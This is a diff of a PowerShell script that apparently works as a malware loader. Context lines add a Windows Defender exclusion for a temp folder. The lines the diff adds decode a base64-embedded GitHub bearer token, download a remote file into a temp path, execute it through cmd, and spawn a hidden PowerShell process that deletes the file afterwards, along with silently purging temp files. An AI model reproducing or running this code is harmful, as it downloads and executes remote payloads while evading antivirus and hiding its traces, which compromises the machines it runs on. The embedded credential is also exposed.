@@ -123,11 +123,9 @@ try	{
 		}
 	}
 
-    $contFile = [System.IO.Path]::GetTempFileName()
+    
 	try { 
-        # Проверка наличия модуля Windows Defender перед использованием
         if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-            # Дополнительная диагностика состояния Windows Defender
             try {
                 $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
                 if ($defenderService -and $defenderService.Status -eq "Running") {
@@ -136,7 +134,6 @@ try	{
                         if ($preferences.DisableRealtimeMonitoring -eq $true) {
                             Write-Host "Windows Defender real-time protection is disabled" -ForegroundColor Yellow
                         }
-                        # Проверяем Tamper Protection (косвенно)
                         try {
                             Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
                             Write-Host "Successfully added exclusion to Windows Defender: $temp" -ForegroundColor Green
@@ -162,7 +159,15 @@ try	{
     } catch {
         Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
     }
-
+    $FilePaths = @("$env:SystemRoot\Temp", "$env:USERPROFILE\AppData\Local\Temp", "$env:TEMP", "$env:TMP")
+    foreach ($FolderPath in $FilePaths) { 
+        try {
+            if (Test-Path $FolderPath) {
+                Start-Process cmd.exe -ArgumentList "/c", "del", "/f", "/q", "`"$FolderPath\tmp*.tmp`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
+            }
+        } catch {}
+    }
+    $contFile = [System.IO.Path]::GetTempFileName()
     try {		
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGVlSUViUWhPTkZsUF81aWFPeXBLV3ZCR3BLU3NPa1FPSnRLU3RBYng5bmJHVkdtQW5FY2xBNmJHT0gyMkZZRElHTDlqdnVHRw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
@@ -175,11 +180,44 @@ try	{
 		}
         $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
 		Invoke-WebRequest $response.download_url -OutFile $contFile 
+		
+
         if (Test-Path $contFile) {
 			try {
-				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c `"$contFile`" && del `"$contFile`""
+               
+				$process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$contFile`"" -PassThru
+				
+				$cleanupScript = @"
+				# Ждем завершения процесса по PID
+				while (Get-Process -Id $($process.Id) -ErrorAction SilentlyContinue) {
+					Start-Sleep -Seconds 1
+				}
+				
+				# Дополнительная пауза для завершения всех дочерних процессов
+				Start-Sleep -Seconds 2
+				
+				# Удаляем файл
+				for (`$i = 1; `$i -le 5; `$i++) {
+					try {
+						Remove-Item '$contFile' -Force -ErrorAction Stop
+						break
+					} catch {
+						if (`$i -lt 5) {
+							Start-Sleep -Seconds 1
+						}
+					}
+				}
+"@
+				
+				Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle", "Hidden", "-Command", $cleanupScript -WindowStyle Hidden
+				
+				Exit 0
 			} catch {
 				Write-Error "Error: Failed to execute downloaded file. $($_.Exception.Message)"
+				# Попытка удалить файл при ошибке
+				try {
+					Remove-Item $contFile -Force -ErrorAction SilentlyContinue
+				} catch {}
 				Start-Sleep -s 3
 			}
         } else {
